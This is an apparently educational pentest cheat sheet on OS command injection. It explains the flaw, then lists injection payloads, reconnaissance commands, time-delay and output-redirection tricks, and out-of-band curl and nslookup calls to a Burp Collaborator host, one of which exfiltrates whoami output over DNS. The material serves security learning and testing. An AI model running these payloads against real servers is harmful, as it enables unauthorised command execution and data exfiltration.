---
title: Command Injection
category: Web
order: 9
---

# Injecting OS Commands

OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data. 

Example:

A shopping application lets the user view whether an item is in stock in a particular store. This information is accessed via a URL: 

```
https://example.com/stockStatus?productID=381&storeID=29
```

To provide the stock information, the application must query various legacy systems. For historical reasons, the functionality is implemented by calling out to a shell command with the product and store IDs as arguments: 

```
python3 stockreport.py 381 29
```

If the application implements no defenses against OS command injection, an attacker could submit the following input to execute an arbitrary command: 

```
& echo aiwefwlguh &
```

Final command:

```
python3 stockreport.py & echo aiwefwlguh & 29
```

## Typicall payloads

```
;id
& id &
|| id || 
$(id)
| id |
`id`
0x0a id 0x0a
\n id
```

## Useful Commands

|   **Linux**   |  **Windows** | **Description**     |
|:-------------:|:------------:|---------------------|
|     whoami    |    whoami    | Current user        |
|    uname -a   |      ver     | OS Version          |
|    ifconfig   |   ipconfig   | Network config      |
| netstat -tlpn | netstat -ano | Network connections |
|     ps -ef    |   tasklist   | Processes           |

# Blind Command Injection

Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required. 

## Using Time Delays

The `ping` command is a good way to exploit it because we can specify the number of ICMP packets to send. This enable us to control the time taken for the command to run.

```
& ping -c 10 127.0.0.1 &
```

## Redirecting the output

We can redirect the output from the injected command into a file.

```
& whoami > /var/www/whoami.txt &
```

Finally if we achieved to redirect the output to a directory which is available on the web.

```
https://example.com/whoami.txt
```

## Out-of-band (OAST)

We can trigger an out-of-band network interaction with a system we control such as ICMP, HTTP or DNS.

> **Note**: Internet connection needed.


```
& curl http://burp-collaborator.oastify.com/rce &
& dig burp-collaborator.oastify.com &
& nslookup burp-collaborator.oastify.com &
```

We can use these channels to easily exfiltrate data:

```
& nslookup `whoami`.burp-collaborator.oastify.com &
```